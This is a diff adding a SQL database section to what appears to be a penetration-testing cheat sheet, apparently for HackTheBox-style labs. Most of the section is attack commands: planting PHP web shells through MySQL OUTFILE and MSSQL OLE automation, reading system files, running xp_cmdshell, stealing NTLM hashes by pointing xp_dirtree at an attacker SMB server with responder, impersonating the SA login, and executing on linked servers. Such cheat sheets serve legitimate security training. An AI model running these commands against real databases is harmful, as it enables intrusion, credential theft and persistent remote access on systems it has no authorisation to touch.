@@ -1224,6 +1224,166 @@ nc -nvlp 9001
 ```
 
 ## SQL Databases
+### Banner Grab with Nmap
+```
+nmap -Pn -sV -sC -p1433 10.10.10.125
+```
+### MySQL Basics
+#### Connect to a MySQL Database
+```
+mysql -u <user> -h <host> -P <port> -p<pass>
+```
+#### Enumerate Databases
+```
+SHOW Databases;
+```
+```
+USE <database>;
+```
+#### Enumerate Tables
+```
+SHOW TABLES;
+```
+```
+DESCRIBE <table>;
+```
+#### Retrieve Data
+```
+SELECT * FROM <table>;
+```
+```
+SELECT <column1>,<column2> FROM <table>;
+```
+```
+SELECT <column1>,<column2> FROM <table> ORDER BY <column2>;
+```
+```
+SELECT <column1>,<column2> FROM <table> WHERE <condition>;
+```
+#### Write a file
+```
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+#### Secure File Privileges
+```
+show variables like "secure_file_priv";
+```
+#### Read Local Files
+```
+select LOAD_FILE("/etc/passwd");
+```
+
+### MSSQL Basics
+#### Connect to a MSSQL Database
+```
+sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
+```
+```
+sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
+```
+```
+mssqlclient.py -p 1433 julio@10.129.203.7
+```
+#### Enumerate Databases
+```
+SELECT name FROM master.dbo.sysdatabases
+GO
+```
+```
+USE <database>
+go
+```
+#### Enumerate Tables
+```
+SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
+go
+```
+#### Retrieve Data
+```
+SELECT * FROM users
+go
+```
+#### Execute Commands
+```
+xp_cmdshell 'whoami'
+go
+```
+#### Enable Ole Automation Procedures
+```
+sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+sp_configure 'Ole Automation Procedures', 1
+GO
+RECONFIGURE
+GO
+```
+#### Create a File
+```
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+GO
+```
+#### Read Local File
+```
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+GO
+```
+#### Capture Service Hash - Start a Hash Catcher
+```
+responder -I tun0
+smbserver share ./ -smb2support
+```
+#### Capture Service Hash - Hash Stealing
+```
+EXEC master..xp_dirtree '\\10.10.110.17\share\'
+GO
+```
+or
+```
+EXEC master..xp_subdirs '\\10.10.110.17\share\'
+GO
+```
+#### Impersonate Users
+##### Identify Impersonable Users
+```
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+GO
+```
+##### Verify Current User and Role
+```
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+go
+```
+##### Impersonating the SA User
+```
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+```
+##### Communication iwht other Databases
+```
+SELECT srvname, isremote FROM sysservers
+GO
+```
+##### Execute Commands on Linked Servers
+```
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+GO
+```
+
 ## RDP
 ## DNS
 ## SMTP
